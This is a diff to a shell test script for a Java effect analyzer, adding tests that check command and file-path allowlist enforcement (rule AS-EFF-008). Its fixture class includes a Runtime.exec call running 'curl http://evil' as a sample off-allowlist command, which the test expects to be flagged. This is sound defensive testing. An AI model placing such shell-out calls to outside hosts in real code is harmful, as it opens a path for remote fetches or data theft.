@@ -229,6 +229,34 @@ want   "the real URL host is extracted"                     "$mix" 'real.example
 absent "a dotted property key is NOT a host"                "$mix" 'os.name'
 absent "a message key is NOT a host"                         "$mix" 'terms.agency'
 
+echo "== policy: Exec command + Fs path allowlists (AS-EFF-008) =="
+mkdir -p "$W/asrc/svc"
+cat > "$W/asrc/svc/Ops.java" <<'J'
+package svc;
+import java.nio.file.*;
+public class Ops {
+  public void run()   throws Exception { new ProcessBuilder("git","clone","https://x").start(); }
+  public void shell() throws Exception { Runtime.getRuntime().exec("curl http://evil"); }
+  public void read()  throws Exception { Files.readString(Path.of("/etc/app/cfg")); }
+  public void write() throws Exception { Files.write(Path.of("/var/data"), "SECRET".getBytes()); }
+}
+J
+javac -d "$W/acls" $(find "$W/asrc" -name '*.java') 2>/dev/null
+"$CJ" "$W/acls" --json "$W/a.json" >/dev/null 2>&1
+aj="$(cat "$W/a.json")"
+# extraction precision (the spec forbids over-claiming)
+want   "Exec cmd = the program (git), not an arg"   "$aj" '"git"'
+absent "a ProcessBuilder ARG is not a command"      "$aj" '"clone"'
+want   "Fs path from Path.of"                        "$aj" '/var/data'
+absent "Files.write DATA is not a path"             "$aj" 'SECRET'
+# enforcement
+printf 'allow Exec in svc git\nallow Fs in svc /etc/app\n' > "$W/apol"
+ax="$(CANDOR_POLICY="$W/apol" "$CJ" "$W/acls" 2>&1)"
+want   "AS-EFF-008 flags an off-allowlist command"  "$ax" '[AS-EFF-008] `svc.Ops.shell`'
+want   "AS-EFF-008 flags an off-allowlist path"     "$ax" '[AS-EFF-008] `svc.Ops.write`'
+absent "an allowed command (git) is not flagged"    "$ax" 'Ops.run'
+absent "an allowed path prefix is not flagged"      "$ax" 'Ops.read'
+
 echo "== containment (effect-leakage diagnostic + ratchet) =="
 mkdir -p "$W/csrc/dao" "$W/csrc/model"
 cat > "$W/csrc/dao/Repo.java" <<'J'
